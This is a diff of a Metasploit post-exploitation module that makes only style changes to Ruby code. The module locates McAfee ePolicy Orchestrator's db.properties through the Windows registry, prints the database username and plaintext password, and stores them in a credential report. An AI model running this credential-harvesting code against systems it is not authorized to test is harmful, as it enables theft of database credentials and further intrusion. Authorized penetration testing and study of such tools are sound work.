@@ -42,19 +42,19 @@ class MetasploitModule < Msf::Post
     # Find out where things are installed
     print_status('Finding Tomcat install path...')
     subkeys = registry_enumkeys('HKLM\Software\Network Associates\ePolicy Orchestrator', REGISTRY_VIEW_32_BIT)
-    if subkeys.nil? or subkeys.empty?
-      print_error ('ePO 4.6 Not Installed or No Permissions to RegKey')
+    if subkeys.nil? || subkeys.empty?
+      print_error('ePO 4.6 Not Installed or No Permissions to RegKey')
       return
     end
     # Get the db.properties file location
     epol_reg_key = 'HKLM\Software\Network Associates\ePolicy Orchestrator'
     dbprops_file = registry_getvaldata(epol_reg_key, 'TomcatFolder', REGISTRY_VIEW_32_BIT)
-    if dbprops_file == nil or dbprops_file == ''
+    if dbprops_file.nil? || (dbprops_file == '')
       print_error('Could not find db.properties file location')
     else
-      dbprops_file << '/conf/orion/db.properties';
-      print_good('Found db.properties location');
-      process_config(dbprops_file);
+      dbprops_file << '/conf/orion/db.properties'
+      print_good('Found db.properties location')
+      process_config(dbprops_file)
     end
   end
 
@@ -107,7 +107,7 @@ class MetasploitModule < Msf::Post
     # resolve IP address for creds reporting
 
     result = client.net.resolve.resolve_host(database_server_name)
-    if result[:ip].nil? or result[:ip].empty?
+    if result[:ip].nil? || result[:ip].empty?
       print_error('Could not determine IP of DB - credentials not added to report database')
       return
     end
@@ -121,18 +121,18 @@ class MetasploitModule < Msf::Post
       print_good("Database IP: #{db_ip}")
     end
     print_good("Port: #{port}")
-    if user_domain == nil or user_domain == ''
-      print_good('Authentication Type: SQL');
+    if user_domain.nil? || (user_domain == '')
+      print_good('Authentication Type: SQL')
       full_user = user_name
     else
-      print_good('Authentication Type: Domain');
-      print_good("Domain: #{user_domain}");
+      print_good('Authentication Type: Domain')
+      print_good("Domain: #{user_domain}")
       full_user = "#{user_domain}\\#{user_name}"
     end
     print_good("User: #{full_user}")
     print_good("Password: #{plaintext_passwd}")
 
-    if (db_ip)
+    if db_ip
       # submit to reports
       service_data = {
         address: Rex::Socket.getaddress(db_ip),
@@ -145,7 +145,7 @@ class MetasploitModule < Msf::Post
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         username: full_user,
         private_data: plaintext_passwd,
         private_type: :password
